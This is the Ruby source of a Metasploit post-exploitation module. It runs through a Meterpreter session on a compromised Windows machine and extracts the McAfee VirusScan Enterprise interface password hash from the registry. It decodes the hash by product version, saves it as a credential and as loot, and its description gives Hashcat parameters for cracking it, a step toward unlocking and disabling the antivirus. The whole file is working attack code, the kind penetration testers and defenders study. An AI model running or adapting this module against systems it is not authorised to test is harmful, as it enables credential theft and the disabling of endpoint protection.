##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  VERSION_5 = Gem::Version.new('5.0')
  VERSION_6 = Gem::Version.new('6.0')
  VERSION_8 = Gem::Version.new('8.0')
  VERSION_9 = Gem::Version.new('9.0')

  def initialize(info = {})
    super(update_info(
      info,
      'Name'          => 'McAfee Virus Scan Enterprise Password Hashes Dump',
      'Description'   => %q(
        This module extracts the password hash from McAfee Virus Scan Enterprise (VSE)
        used to lock down the user interface. Hashcat supports cracking this type of
        hash using hash type sha1($salt.unicode($pass)) (-m 140) and a hex salt
        (--hex-salt) of 01000f000d003300 (unicode "\x01\x0f\x0d\x33"). A dynamic
        format is available for John the Ripper at the referenced URL.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Mike Manzotti <mike.manzotti[at]dionach.com>', # Metasploit module
        'Maurizio inode Agazzini' # original research
      ],
      'References'    => [
        ['URL', 'https://www.dionach.com/blog/disabling-mcafee-on-access-scanning']
      ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    print_status("Looking for McAfee VSE password hashes on #{sysinfo['Computer']} ...")

    vse_keys = enum_vse_keys
    if vse_keys.empty?
      vprint_error("McAfee VSE not installed or insufficient permissions")
      return
    end

    hashes_and_versions = extract_hashes_and_versions(vse_keys)
    if hashes_and_versions.empty?
      vprint_error("No McAfee VSE hashes extracted")
      return
    end
    process_hashes_and_versions(hashes_and_versions)
  end

  def enum_vse_keys
    vprint_status('Enumerating McAfee VSE installations')
    keys = []
    [
      'HKLM\\Software\\Wow6432Node\\McAfee\\DesktopProtection', # 64-bit
      'HKLM\\Software\\McAfee\\DesktopProtection' # 32-bit
    ].each do |key|
      subkeys = registry_enumkeys(key)
      keys << key unless subkeys.nil?
    end
    keys
  end

  def extract_hashes_and_versions(keys)
    vprint_status("Attempting to extract hashes from #{keys.size} McAfee VSE installations")
    hash_map =  {}
    keys.each do |key|
      hash = registry_getvaldata(key, "UIPEx")
      if hash.empty?
        vprint_error("No McAfee VSE password hash found in #{key}")
        next
      end

      version = registry_getvaldata(key, "szProductVer")
      if version.empty?
        vprint_error("No McAfee VSE version key found in #{key}")
        next
      end
      hash_map[hash] = Gem::Version.new(version)
    end
    hash_map
  end

  def process_hashes_and_versions(hashes_and_versions)
    hashes_and_versions.each do |hash, version|
      if version >= VERSION_5 && version < VERSION_6
        hashtype = 'md5u'
        version_name = 'v5'
      else
        # Base64 decode hash
        hash =  Rex::Text.to_hex(Rex::Text.decode_base64(hash), "")
        hashtype = 'dynamic_1405'
        version_name = 'v8'
        unless version >= VERSION_8 && version < VERSION_9
          print_warning("Unknown McAfee VSE version #{version} - Assuming v8")
        end
      end

      print_good("McAfee VSE #{version_name} (#{hashtype}) password hash: #{hash}")

      credential_data = {
        post_reference_name: refname,
        origin_type: :session,
        private_type: :nonreplayable_hash,
        private_data: hash,
        session_id: session_db_id,
        jtr_format: hashtype,
        workspace_id: myworkspace_id
      }

      create_credential(credential_data)

      # Store McAfee password hash as loot
      loot_path = store_loot('mcafee.hash', 'text/plain', session, "mcafee:#{hash}", 'mcafee_hashdump.txt', 'McAfee Password Hash')
      print_good("McAfee VSE password hash saved in: #{loot_path}")
    end
  end
end
